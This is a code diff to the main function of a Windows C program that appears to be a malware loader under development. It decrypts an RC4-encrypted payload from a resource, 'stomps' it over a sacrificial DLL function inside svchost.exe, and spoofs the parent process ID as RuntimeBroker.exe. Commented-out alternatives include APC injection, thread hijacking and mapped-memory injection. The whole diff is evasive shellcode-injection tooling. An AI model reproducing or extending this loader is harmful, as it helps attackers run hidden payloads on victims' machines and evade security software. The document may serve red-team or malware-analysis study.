@@ -10,20 +10,24 @@ int main()
 	RESOURCE resource;
 	PVOID pExPayload, pStompingTarget = NULL;
 	LPWSTR TargetProcessName = L"svchost.exe";
-	LPSTR  pTargetProcessName = "Notepad.exe";
+	LPSTR  pTargetProcessName = "RuntimeBroker.exe";
 	//if(!FetchLocalAllertableThread(GetCurrentThreadId(), &dwThreadId, &hThread)) return -2;
 	EnumRemoteProcessHandle(TargetProcessName, &dwPID0, &hProcess);
+
+	FetchStompingTarget(SACRIFICIAL_DLL, SACRIFICIAL_FUNC, &pStompingTarget);
+
 	//CreateDebuggedProcess("Notepad.exe", &dwPID1, &hProcess1, &hThread1);
-	
+
 	/*if (!EnumProcessNTQuerySystemInformation(TargetProcessName, &dwPID0, &hProcess)) 
 	{
 	wprintf(L"[!] Enumerate Processes Nt Query System Information Failed to Find %s\n", TargetProcessName);
 		return -1;
 	}
 	*/
-	SpoofParentProcessId(pTargetProcessName, hProcess, &dwPID1, &hProcess1, &hThread);
+	
 
-	printf("Parent Process PID %lu Child Process PID %lu", dwPID0, dwPID1);
+
+
 	//if(!FetchRemoteThreadHandle(dwPID0, &dwThreadId, &hThread)) return -2;
 
 	//wprintf(L"[i] Found %s Process with id %d\n", TargetProcessName, dwPID0);
@@ -46,14 +50,19 @@ int main()
 
 	if (!(pObfInput = LocalAlloc(LPTR, resource.sSize))) return -14;
 
-	//InjectPayloadRemoteMappedMemory(resource.pAddress, &pExtPayloadAddres, &pObfInput,resource.sSize, &hPayloadObjectHandle,hProcess);
 	
 	if (!rInit(&RC4Context_t, pKey, strlen((CHAR*)pKey))) return -6;
 
 	rFin(&RC4Context_t, (PVOID)resource.pAddress, pObfInput, resource.sSize);
 
+	StompRemoteFunction(pStompingTarget, hProcess, pObfInput, resource.sSize);
+
+	//InjectPayloadRemoteMappedMemory(pStompingTarget, &pExtPayloadAddres, &pObfInput, resource.sSize, &hPayloadObjectHandle, hProcess);
+
+	//APCPayloadInjection(hThread, pObfInput, resource.sSize);
 	//InjectRemoteDll(pObfInput, hProcess, SACRIFICIAL_DLL, SACRIFICIAL_FUNC, resource.sSize, &pStompingTarget);
 
+	/*Payload Execution Control Code
 	if ((hPayloadObjectHandle = CreateSemaphoreA(NULL, 15, 15, "Control String")))
 	{
 		printf("[i] Created A Semaphore Successfully!\n");
@@ -92,12 +101,11 @@ int main()
 		}
 
 	}
-	
+	*/
 
 	//if(!MapLocalMemory(pPayload_t.pText, &pExtPayloadAddres, pPayload_t.sText, &hPayloadObjectHandle))return -7;
 
 	//InjectPayloadRemoteMappedMemory(pExtPayloadAddres, &pExtPayloadAddres, resource.sSize, &hPayloadObjectHandle, hProcess);
-
 
 	//SetupScanFileQueueA(NULL, NULL, NULL, NULL, NULL, NULL);
 	
@@ -106,11 +114,11 @@ int main()
 	//UnmapViewOfFile(pObfInput);
 
 	//HijackThread(hThread, pStompingTarget);
-
+	SpoofParentProcessId(pTargetProcessName, hProcess, &dwPID1, &hProcess1, &dwThreadId, &hThread);
 	hThread1 = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxA, NULL, NULL, &dwThreadId);
-
-	if(!hThread) WaitForSingleObject(hThread1, INFINITE);
-
+	CloseHandle(hProcess);
+	if(!hThread1) WaitForSingleObject(hThread1, INFINITE);
+	printf("Parent Process PID %lu Child Process PID %lu\n", dwPID0, dwPID1);
 	//hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExtPayloadAddres, NULL, NULL, &dwThreadId);
 
 	//if (!(pExPayload = VirtualAllocEx(hProcess1, 0, pPayload_t.sText,MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) return -7;
@@ -121,7 +129,7 @@ int main()
 
 	//QueueUserAPC((PAPCFUNC)pExtPayloadAddres, hThread, 0);
 	
-	//InjectCallbackPayloadEnumDesktops(pPayload_t.pText, (DWORD)pPayload_t.sText, &dwOldProtections, (PVOID*)&pExtPayloadAddres);
+	//InjectCallbackPayloadEnumDesktops(pObfInput, (DWORD)resource.sSize, &dwOldProtections, (PVOID*)&pExtPayloadAddres);
 
 	//WaitForSingleObject(hThread, 150);
 
@@ -129,11 +137,11 @@ int main()
 	
 	printf("Injecting Shellcode At Address: 0x%p\n", pStompingTarget);
 
-	//getchar();
+	getchar();
 
 	//DebugActiveProcessStop(dwPID1);
 
-	//ResumeThread(hThread1);
+	ResumeThread(hThread);
 
 	//CloseHandle(hThread);
 
@@ -144,8 +152,6 @@ int main()
 	char pPath[MAX_PATH] = { '\0' };
 
 	printf("[#] Press 'Enter' To Exit! :)");
-
-	Sleep(200 * 10);
 
 	return 0;
 }
